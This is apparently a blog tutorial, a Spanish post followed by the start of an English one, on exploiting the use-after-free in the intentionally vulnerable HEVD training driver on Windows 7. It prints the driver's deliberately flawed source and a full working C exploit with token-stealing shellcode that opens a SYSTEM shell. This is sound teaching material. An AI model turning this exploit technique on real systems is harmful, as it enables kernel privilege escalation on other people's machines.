Status = AllocateUaFObjectNonPagedPool(); 370 371 return Status; 372 } Esta función llamará AllocateUaFObjectNonPagedPool, que comienza en línea 86.\n86 NTSTATUS 87 AllocateUaFObjectNonPagedPool( 88 VOID 89 ) 90 { 91 NTSTATUS Status = STATUS_UNSUCCESSFUL; 92 PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL; 93 94 PAGED_CODE(); 95 96 __try 97 { 98 DbgPrint(\u0026#34;[+] Allocating UaF Object\\n\u0026#34;); 99 100 // 101 // Allocate Pool chunk 102 // 103 104 UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag( 105 NonPagedPool, 106 sizeof(USE_AFTER_FREE_NON_PAGED_POOL), 107 (ULONG)POOL_TAG 108 ); 109 110 if (!UseAfterFree) 111 { 112 // 113 // Unable to allocate Pool chunk 114 // 115 116 DbgPrint(\u0026#34;[-] Unable to allocate Pool chunk\\n\u0026#34;); 117 118 Status = STATUS_NO_MEMORY; 119 return Status; 120 } 121 else 122 { 123 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 124 DbgPrint(\u0026#34;[+] Pool Type: %s\\n\u0026#34;, STRINGIFY(NonPagedPool)); 125 DbgPrint(\u0026#34;[+] Pool Size: 0x%X\\n\u0026#34;, sizeof(USE_AFTER_FREE_NON_PAGED_POOL)); 126 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, UseAfterFree); 127 } 128 129 // 130 // Fill the buffer with ASCII \u0026#39;A\u0026#39; 131 // 132 133 RtlFillMemory((PVOID)UseAfterFree-\u0026gt;Buffer, sizeof(UseAfterFree-\u0026gt;Buffer), 0x41); 134 135 // 136 // Null terminate the char buffer 137 // 138 139 UseAfterFree-\u0026gt;Buffer[sizeof(UseAfterFree-\u0026gt;Buffer) - 1] = \u0026#39;\\0\u0026#39;; 140 141 // 142 // Set the object Callback function 143 // 144 145 UseAfterFree-\u0026gt;Callback = \u0026amp;UaFObjectCallbackNonPagedPool; 146 147 // 148 // Assign the address of UseAfterFree to a global variable 149 // 150 151 g_UseAfterFreeObjectNonPagedPool = UseAfterFree; 152 153 DbgPrint(\u0026#34;[+] UseAfterFree Object: 0x%p\\n\u0026#34;, UseAfterFree); 154 DbgPrint(\u0026#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool); 155 DbgPrint(\u0026#34;[+] UseAfterFree-\u0026gt;Callback: 0x%p\\n\u0026#34;, UseAfterFree-\u0026gt;Callback); 156 } 157 __except (EXCEPTION_EXECUTE_HANDLER) 158 { 159 Status = GetExceptionCode(); 160 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 161 } 162 163 return Status; 164 } Analicemos esta función en un nivel alto.\nLíneas 91-92 vemos que se declaran variables, una de ellas es una estructura personalizada que contiene dos miembros: un puntero a una función y un char buffer[0x54]. En línea 94 vemos el PAGED_CODE macro definido. Este macro marca esta función \u0026ldquo;pageable\u0026rdquo;. Lo que esto significa es que, si la función no está presente en la memoria, se puede mover al disco. El OS ará esto si necesita memoria física para otras cosas. Líneas 104-108 vemos una llamada a ExAllocatePoolWithTag() esto es una llamada del Windows API. Básicamente, lo que esto hace es crear \u0026ldquo;memoria de piscina\u0026rdquo; o \u0026ldquo;pool memory\u0026rdquo; de un tipo específico y devolverá un puntero a la sección de memoria creada, que como podemos ver luego se \u0026ldquo;cast\u0026rdquo;. Argumento 1: Aquí usamos una piscina \u0026ldquo;Nonpaged\u0026rdquo;, al que puede acceder cualquier IRQL, notablemente la memoria asignada con este tipo es ejecutable o EXECUTABLE. Argumento 2: Tamaño Argumento 3: Una marca de la piscina, que a mi entender es para debug. Lo podemos encontrar en \u0026ldquo;common.h\u0026rdquo; como Hack o \u0026ldquo;kcaH\u0026rdquo; como tiene que estar en orden inverso. Líneas 110-127 nosotros podemos ignorar ya que es solo comprobando la última llamada si fue malo / bueno En línea 133 básicamente vemos una llamada a RtlFillMemory() otro Windows API (memset en nix). En línea 139 terminamos el buffer que llenamos con A\u0026rsquo;s con un NULL En línea 145 establecemos el puntero a la función para apuntar a la función UaFObjectCallbackNonPagedPool. En línea 151 asignamos la dirección del objeto creado a la variable global. No está tan mal! Solo estamos creando una región de memoria (marcado ejecutable) para sostener la estructura PUSE_AFTER_FREE_NON_PAGED_POOL, llenar el Buffer miembro (char array), y establece el miembro de Callback (puntero a una función). La definición de la estructura se puede ver a aquí:\n62 typedef struct _USE_AFTER_FREE_NON_PAGED_POOL 63 { 64 FunctionPointer Callback; 65 CHAR Buffer[0x54]; 66 } USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL; Entender el UseUaFObjectNonPagedPoolIoctlHandler # Una vez más, este es un \u0026ldquo;wrapper\u0026rdquo; para llamar a otra función:\n375 /// \u0026lt;summary\u0026gt; 376 /// Use UaF Object NonPagedPool Ioctl Handler 377 /// \u0026lt;/summary\u0026gt; 378 /// \u0026lt;param name=\u0026#34;Irp\u0026#34;\u0026gt;The pointer to IRP\u0026lt;/param\u0026gt; 379 /// \u0026lt;param name=\u0026#34;IrpSp\u0026#34;\u0026gt;The pointer to IO_STACK_LOCATION structure\u0026lt;/param\u0026gt; 380 /// \u0026lt;returns\u0026gt;NTSTATUS\u0026lt;/returns\u0026gt; 381 NTSTATUS 382 UseUaFObjectNonPagedPoolIoctlHandler( 383 _In_ PIRP Irp, 384 _In_ PIO_STACK_LOCATION IrpSp 385 ) 386 { 387 NTSTATUS Status = STATUS_UNSUCCESSFUL; 388 389 UNREFERENCED_PARAMETER(Irp); 390 UNREFERENCED_PARAMETER(IrpSp); 391 PAGED_CODE(); 392 393 Status = UseUaFObjectNonPagedPool(); 394 395 return Status; 396 } Miremos UseUaFObjectNonPagedPool().\n171 NTSTATUS 172 UseUaFObjectNonPagedPool( 173 VOID 174 ) 175 { 176 NTSTATUS Status = STATUS_UNSUCCESSFUL; 177 178 PAGED_CODE(); 179 180 __try 181 { 182 if (g_UseAfterFreeObjectNonPagedPool) 183 { 184 DbgPrint(\u0026#34;[+] Using UaF Object\\n\u0026#34;); 185 DbgPrint(\u0026#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool); 186 DbgPrint(\u0026#34;[+] g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback); 187 DbgPrint(\u0026#34;[+] Calling Callback\\n\u0026#34;); 188 189 if (g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback) 190 { 191 g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback(); 192 } 193 194 Status = STATUS_SUCCESS; 195 } 196 } 197 __except (EXCEPTION_EXECUTE_HANDLER) 198 { 199 Status = GetExceptionCode(); 200 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 201 } 202 203 return Status; 204 } No está tan mal, simplemente llamamos la función Callback, que vimos anteriormente estaba ambientado en el AllocateUaFObjectNonPagedPoolIoctlHandler() a UaFObjectCallbackNonPagedPool.\nEntender el FreeUaFObjectNonPagedPoolIoctlHandler # Una vez más vemos que este controlador no acepta argumentos:\n405 NTSTATUS 406 FreeUaFObjectNonPagedPoolIoctlHandler( 407 _In_ PIRP Irp, 408 _In_ PIO_STACK_LOCATION IrpSp 409 ) 410 { 411 NTSTATUS Status = STATUS_UNSUCCESSFUL; 412 413 UNREFERENCED_PARAMETER(Irp); 414 UNREFERENCED_PARAMETER(IrpSp); 415 PAGED_CODE(); 416 417 Status = FreeUaFObjectNonPagedPool(); 418 419 return Status; 420 } Miremos FreeUaFObjectNonPagedPool:\n211 NTSTATUS 212 FreeUaFObjectNonPagedPool( 213 VOID 214 ) 215 { 216 NTSTATUS Status = STATUS_UNSUCCESSFUL; 217 218 PAGED_CODE(); 219 220 __try 221 { 222 if (g_UseAfterFreeObjectNonPagedPool) 223 { 224 DbgPrint(\u0026#34;[+] Freeing UaF Object\\n\u0026#34;); 225 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 226 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool); 227 228 #ifdef SECURE 229 // 230 // Secure Note: This is secure because the developer is setting 231 // \u0026#39;g_UseAfterFreeObjectNonPagedPool\u0026#39; to NULL once the Pool chunk is being freed 232 // 233 234 ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG); 235 236 // 237 // Set to NULL to avoid dangling pointer 238 // 239 240 g_UseAfterFreeObjectNonPagedPool = NULL; 241 #else 242 // 243 // Vulnerability Note: This is a vanilla Use After Free vulnerability 244 // because the developer is not setting \u0026#39;g_UseAfterFreeObjectNonPagedPool\u0026#39; to NULL. 245 // Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer 246 // (dangling pointer) 247 // 248 249 ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG); 250 #endif 251 252 Status = STATUS_SUCCESS; 253 } 254 } 255 __except (EXCEPTION_EXECUTE_HANDLER) 256 { 257 Status = GetExceptionCode(); 258 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 259 } 260 261 return Status; 262 } Aquí vemos una llamada a una nueva Windows API la función ExFreePoolWithTag. Esta función simplemente desasigna un bloque de memoria del grupo que se creó con un nombre específico (Hack), sin embargo podemos ver que la variable global g_UseAfterFreeObjectNonPagedPool nunca se hace NULL. Esto significa g_UseAfterFreeObjectNonPagedPool contendrá un puntero al objeto liberado incluso después de haber sido liberado - un dangling pointer.\nEntender el AllocateFakeObjectNonPagedPoolIoctlHandler # Al observar este controlador, vemos que requiere algunos argumentos del usuario en línea 441.\n429 NTSTATUS 430 AllocateFakeObjectNonPagedPoolIoctlHandler( 431 _In_ PIRP Irp, 432 _In_ PIO_STACK_LOCATION IrpSp 433 ) 434 { 435 NTSTATUS Status = STATUS_UNSUCCESSFUL; 436 PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject = NULL; 437 438 UNREFERENCED_PARAMETER(Irp); 439 PAGED_CODE(); 440 441 UserFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 442 443 if (UserFakeObject) 444 { 445 Status = AllocateFakeObjectNonPagedPool(UserFakeObject); 446 } 447 448 return Status; 449 } De aquí, llamamos AllocateFakeObjectNonPagedPool.\n270 NTSTATUS 271 AllocateFakeObjectNonPagedPool( 272 _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject 273 ) 274 { 275 NTSTATUS Status = STATUS_SUCCESS; 276 PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL; 277 278 PAGED_CODE(); 279 280 __try 281 { 282 DbgPrint(\u0026#34;[+] Creating Fake Object\\n\u0026#34;); 283 284 // 285 // Allocate Pool chunk 286 // 287 288 KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag( 289 NonPagedPool, 290 sizeof(FAKE_OBJECT_NON_PAGED_POOL), 291 (ULONG)POOL_TAG 292 ); 293 294 if (!KernelFakeObject) 295 { 296 // 297 // Unable to allocate Pool chunk 298 // 299 300 DbgPrint(\u0026#34;[-] Unable to allocate Pool chunk\\n\u0026#34;); 301 302 Status = STATUS_NO_MEMORY; 303 return Status; 304 } 305 else 306 { 307 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 308 DbgPrint(\u0026#34;[+] Pool Type: %s\\n\u0026#34;, STRINGIFY(NonPagedPool)); 309 DbgPrint(\u0026#34;[+] Pool Size: 0x%X\\n\u0026#34;, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); 310 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelFakeObject); 311 } 312 313 // 314 // Verify if the buffer resides in user mode 315 // 316 317 ProbeForRead( 318 (PVOID)UserFakeObject, 319 sizeof(FAKE_OBJECT_NON_PAGED_POOL), 320 (ULONG)__alignof(UCHAR) 321 ); 322 323 // 324 // Copy the Fake structure to Pool chunk 325 // 326 327 RtlCopyMemory( 328 (PVOID)KernelFakeObject, 329 (PVOID)UserFakeObject, 330 sizeof(FAKE_OBJECT_NON_PAGED_POOL) 331 ); 332 333 // 334 // Null terminate the char buffer 335 // 336 337 KernelFakeObject-\u0026gt;Buffer[sizeof(KernelFakeObject-\u0026gt;Buffer) - 1] = \u0026#39;\\0\u0026#39;; 338 339 DbgPrint(\u0026#34;[+] Fake Object: 0x%p\\n\u0026#34;, KernelFakeObject); 340 } 341 __except (EXCEPTION_EXECUTE_HANDLER) 342 { 343 Status = GetExceptionCode(); 344 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 345 } 346 347 return Status; 348 } Analicemos esto:\nLíneas 288-311 creamos un pedazo de memoria como antes, pero esta vez es un \u0026ldquo;objeto falso\u0026rdquo;. Solo mirando la estructura, es del mismo tamaño que el objeto PUSE_AFTER_FREE_NON_PAGED_POOL Líneas 317-321 vemos un nuevo Windows API ProbeForRead que comprueba que el modo de usuario esté correctamente alineado. Líneas 327-331 nosotros RtlCopyMemory / movemos el búfer de modo de usuario a la sección falsa de memoria que se creó Líneas 333-347 nosotros finalizamos el buffer con NULL y regresamos. Como referencia, este es el objeto falso:\n68 typedef struct _FAKE_OBJECT_NON_PAGED_POOL 69 { 70 CHAR Buffer[0x58]; 71 } FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL; Si estás familiarizado con la exploitation de el modo de usuario, probablemente tus ojos se estan iluminando.\nDescripciones de Funciones # En corto esto es lo que hacen las funciones:\nFunction Summary AllocateUaFObjectNonPagedPoolIoctlHandler Solo estamos creando una región de memoria (ejecutable) para sostener la estructura PUSE_AFTER_FREE_NON_PAGED_POOL, llenando el miembro Buffer (char array), y estableciendo el miembro Callback UseUaFObjectNonPagedPoolIoctlHandler Llama al puntero a la función Callback de el variable global g_UseAfterFreeObjectNonPagedPool FreeUaFObjectNonPagedPoolIoctlHandler Free\u0026rsquo;s the g_UseAfterFreeObjectNonPagedPool object, and DOES NOT NULL out the variable (dangling pointer) AllocateFakeObjectNonPagedPoolIoctlHandler Crea una región de memoria para contener un objeto del mismo tamaño que la región de memoria original creada, pero con argumentos controlados por el usuario Viendo esto tenemos un clásico UAF. Nunca he hecho un Windows UAF pero supongo que el objeto falso ocupará el espacio creado anteriormente. Para hacer esto en teoría sólo necesitamos:\nCrear un objeto USE_AFTER_FREE_NON_PAGED_POOL Libera el objeto Crear un objeto FAKE_OBJECT_NON_PAGED_POOL (recuperando la memoria que fue liberada) Llamar g_UseAfterFreeObjectNonPagedPool.Callback que debería apuntar a la estructura corrupta Explotación # Desde aquí escribiendo un PoC parecía fácil, y dado que tuvimos acceso al código:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_ALLOCATE_ROBJ IOCTL(0x804) #define HEVD_CALL_FPTR IOCTL(0x805) #define HEVD_FREE IOCTL(0x806) #define HEVD_ALLOCATE_FOBJ IOCTL(0x807) typedef struct _FAKE_OBJECT_NON_PAGED_POOL { CHAR Buffer[0x58]; } FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL; void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; printf(\u0026#34;[*] Calling IOCTL Code 0x%x\\n\u0026#34;, dIoctl); DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } char *allocate_buffer() { char *buffer = malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL)); if (buffer != NULL) { printf(\u0026#34;[*] Allocated %d bytes (userland)\\n\u0026#34;, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); memset(buffer, 0x41, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); } return buffer; } int main() { HANDLE hHEVD = NULL; char *evilBuffer = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } evilBuffer = allocate_buffer(); if (evilBuffer == NULL) { printf(\u0026#34;[*] Failed to allocate evil buffer (userland)\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, 0); printf(\u0026#34;[*] Freeing object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_FREE, NULL, 0); printf(\u0026#34;[*] Allocating FAKE_OBJECT_NON_PAGED_POOL\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, HEVD_CALL_FPTR, NULL, 0); } Una vez enviado, podemos ver que hemos ganado control sobre el flujo de ejecución.\nVemos 41414141 entonces podemos asumir que los primeros 4 bytes son el puntero a la función, podemos confirmar esto basándonos en el código dentro (UseAfterFreeNonPagedPool.h):\n62 typedef struct _USE_AFTER_FREE_NON_PAGED_POOL 63 { 64 FunctionPointer Callback; 65 CHAR Buffer[0x54]; 66 } USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL; Escribamos nuestro exploit!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_ALLOCATE_ROBJ IOCTL(0x804) #define HEVD_CALL_FPTR IOCTL(0x805) #define HEVD_FREE IOCTL(0x806) #define HEVD_ALLOCATE_FOBJ IOCTL(0x807) typedef struct _FAKE_OBJECT_NON_PAGED_POOL { CHAR Buffer[0x58]; } FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL; /* sendIoctl: Send the IOCTL code to the driver */ void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; printf(\u0026#34;[*] Calling IOCTL Code 0x%x\\n\u0026#34;, dIoctl); DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } /* allocate_buffer: Creates a userland allocation with the first 4 bytes pointing to the address where our shellcode was allocated. */ char *allocate_buffer(void *shellcode_addr) { char *buffer = malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL)); if (buffer != NULL) { printf(\u0026#34;[*] Shellcode located at: %p\\n\u0026#34;, \u0026amp;shellcode_addr); memcpy(buffer, \u0026amp;shellcode_addr, 4); memset(buffer+4, \u0026#39;A\u0026#39;, 83); } return buffer; } int main() { HANDLE hHEVD = NULL; char *evilBuffer = NULL; char shellcode[] = // sickle -a x86 -p windows/x86/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal // return to userland code \u0026#34;\\x31\\xc0\u0026#34; // xor eax,eax \u0026#34;\\xC3\u0026#34;; // ret LPVOID lpPayload = VirtualAlloc(NULL, 56, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpPayload == NULL) { printf(\u0026#34;[-] Failed to create shellcode allocation\\n\u0026#34;); return -1; } memcpy(lpPayload, shellcode, 56); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } evilBuffer = allocate_buffer(lpPayload); if (evilBuffer == NULL) { printf(\u0026#34;[*] Failed to allocate evil buffer (userland)\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, 0); printf(\u0026#34;[*] Freeing object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_FREE, NULL, 0); printf(\u0026#34;[*] Allocating FAKE_OBJECT_NON_PAGED_POOL\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, HEVD_CALL_FPTR, NULL, 0); printf(\u0026#34;[+] Enjoy the shell :)\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } Una vez compilado:\ni686-w64-mingw32-gcc poc.c -o poc.exe Nos da acceso!\nRecursos # https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/paged_code ","date":"15 December 2024","externalUrl":null,"permalink":"/posts/0x02-introducci%C3%B3n-a-windows-kernel-uafs/","section":"Posts","summary":"","title":"0x02 - Introducción a Windows Kernel Use After Frees (UaFs)","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! If you\u0026rsquo;ve been following the series consecutively, by now you should have exploited a basic Stack Overflow both within Windows 7 (x86) and Windows 10 (x64). Although this is a major accomplishment there are more vulnerabilities that can result in code execution. The best way to get familiar with them is to exploit them on a system with minimal mitigations. For this reason, we\u0026rsquo;ll be returning back to Windows 7 (x86).\nIn addition, we won\u0026rsquo;t be utilizing Ghidra, this time we\u0026rsquo;ll be using the source code. In the next guide we\u0026rsquo;ll re-introduce Ghidra to give you a valuable perspective on how you would identify it using either source or decompiler output.\nTable of Contents # What is a Use After Free (High Level) Using Source - Getting a Lay of the Land Understanding AllocateUaFObjectNonPagedPoolIoctlHandler Understanding UseUaFObjectNonPagedPoolIoctlHandler Understanding FreeUaFObjectNonPagedPoolIoctlHandler Understanding AllocateFakeObjectNonPagedPoolIoctlHandler Summary of Functions Exploitation Sources What is a Use After Free (High Level) # Just in case you’re not completely familiar with what a Use-After-Free is, let’s give ourselves a quick high-level overview of this bug class. Basically, a Use After Free (UaF) occurs when we Use an object After it has been Free’d. This “object” can be any structure or class loaded in memory that is later freed.\nTo use a non-technical example, let\u0026rsquo;s say you\u0026rsquo;re working under a car and place your tools beside you. You\u0026rsquo;re working upside down so you\u0026rsquo;re not paying attention to your toolbox, you just simply reach into the toolbox and feel around for what you need.\nIn this \u0026ldquo;toolbox\u0026rdquo; you only have a wrench (hard to believe I know), you grab the wrench but instead of putting it back in the toolbox you place it on the floor near your feet. Although at your feet, you believe the wrench has been placed back in its original location.\nWithout you noticing some dude throws a can of soda into the toolbox.\nWhen you go and reach for the wrench you don\u0026rsquo;t notice a difference between it and the can (because you have flippers, you’re a penguin). So, you end up dumping cola all over your new tux.\nOH NO!! We have fallen victim to a UaF, the dude successfully exploited the UaF.\nHow does this relate to computers?\nThe example of blindly reaching into a toolbox mirrors the way programs rely on memory without \u0026ldquo;looking\u0026rdquo; (verifying if it\u0026rsquo;s still valid or changed). The unexpected replacement of the wrench with a soda can demonstrates how stale references (pointers) can lead to unintended and harmful outcomes. The \u0026ldquo;dude\u0026rdquo; throwing a soda can represents an attacker taking advantage of freed memory (e.g., injecting malicious data/code into reused memory). With that we should be ready to get started.\nUsing Source - Getting a Lay of the Land # The first thing we want to identify is the location of the I/O Control Codes. From the looks of it, each vulnerability has its own \u0026ldquo;handler\u0026rdquo; function.\n./ArbitraryWrite.c:129:/// Arbitrary Write Ioctl Handler ./MemoryDisclosureNonPagedPool.c:178:/// Memory Disclosure NonPagedPool Ioctl Handler ./DoubleFetch.c:151:/// Double Fetch Ioctl Handler ./BufferOverflowNonPagedPool.c:165:/// Buffer Overflow NonPagedPool Ioctl Handler ./MemoryDisclosureNonPagedPoolNx.c:177:/// Memory Disclosure NonPagedPoolNx Ioctl Handler ./IntegerOverflow.c:154:/// Integer Overflow Ioctl Handler ./UninitializedMemoryPagedPool.c:216:/// Uninitialized Memory PagedPool Ioctl Handler ./WriteNULL.c:117:/// Write NULL Ioctl Handler ./InsecureKernelResourceAccess.c:148:/// Insecure Kernel File Access Ioctl Handler ./BufferOverflowPagedPoolSession.c:165:/// Buffer Overflow PagedPoolSession Ioctl Handler ./BufferOverflowNonPagedPoolNx.c:165:/// Buffer Overflow NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPool.c:352:/// Allocate UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:376:/// Use UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:400:/// Free UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:424:/// Allocate Fake Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:352:/// Allocate UaF Object NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:376:/// Use UaF Object NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:400:/// Free UaF Object NonPagedPoolNx Ioctl Handler ./UseAfterFreeNonPagedPoolNx.c:424:/// Allocate Fake Object NonPagedPoolNx Ioctl Handler ./BufferOverflowStack.c:121:/// Buffer Overflow Stack Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:553:/// Create Arbitrary Read Write Helper Object Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:582:/// Set Arbitrary Read Write Helper Object Name Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:611:/// Get Arbitrary Read Write Helper Object Name Ioctl Handler ./ArbitraryReadWriteHelperNonPagedPoolNx.c:640:/// Delete Arbitrary Read Write Helper Object Ioctl Handler ./UninitializedMemoryStack.c:160:/// Uninitialized Memory Stack Ioctl Handler ./NullPointerDereference.c:200:/// Null Pointer Dereference Ioctl Handler ./BufferOverflowStackGS.c:121:/// Buffer Overflow Stack GS Ioctl Handler ./TypeConfusion.c:213:/// Type Confusion Ioctl Handler We\u0026rsquo;re interested in the UseAfterFreeNonPagedPool I/O Control Codes.\n./UseAfterFreeNonPagedPool.c:352:/// Allocate UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:376:/// Use UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:400:/// Free UaF Object NonPagedPool Ioctl Handler ./UseAfterFreeNonPagedPool.c:424:/// Allocate Fake Object NonPagedPool Ioctl Handler Based on the naming convention we can identify the following functions:\nAllocateUaFObjectNonPagedPoolIoctlHandler( UseUaFObjectNonPagedPoolIoctlHandler( FreeUaFObjectNonPagedPoolIoctlHandler( AllocateFakeObjectNonPagedPoolIoctlHandler( If we trace where these function calls are used, we are led to ./HackSysExtremeVulnerableDriver.c which contains a switch statement that would allow us to trigger vulnerable functions.\n294 case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL: 295 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 296 Status = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 297 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 298 break; 299 case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL: 300 